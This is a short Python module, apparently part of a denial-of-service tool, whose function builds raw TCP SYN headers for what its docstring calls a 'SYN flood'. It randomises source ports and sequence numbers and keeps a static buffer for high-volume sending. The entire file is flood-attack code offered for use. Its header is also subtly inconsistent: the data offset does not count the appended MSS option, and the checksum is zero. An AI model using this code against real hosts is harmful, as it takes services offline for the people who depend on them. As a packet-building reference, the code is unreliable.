import struct
import random

# Pre-allocate a static SYN packet for efficiency
_STATIC_SYN = struct.pack('!HHLLBBHHH', 12345, 80, 0, 0, (5 << 4), 0x02, 8192, 0, 0) + struct.pack('!BBH', 2, 4, 1460)

def generate_payload(target, options=None):
    """
    TCP SYN flood raw packet (header only, no IP).
    options:
      - src_port: int, source port (random if not set)
      - dst_port: int, destination port (default 80)
      - seq: int, sequence number (random if not set)
      - window: int, window size (default 8192)
      - mss: int, TCP MSS option (default 1460)
      - static: bool, use static buffer for PB-level simulation
    """
    static = options.get('static', False) if options else False
    if static:
        return _STATIC_SYN
    src_port = options.get('src_port', random.randint(1024, 65535)) if options else random.randint(1024, 65535)
    dst_port = options.get('dst_port', 80) if options else 80
    seq = options.get('seq', random.randint(0, 0xFFFFFFFF)) if options else random.randint(0, 0xFFFFFFFF)
    window = options.get('window', 8192) if options else 8192
    mss = options.get('mss', 1460) if options else 1460
    tcp_header = struct.pack('!HHLLBBHHH',
        src_port, dst_port, seq, 0, (5 << 4), 0x02, window, 0, 0)
    tcp_header += struct.pack('!BBH', 2, 4, mss)
    return tcp_header
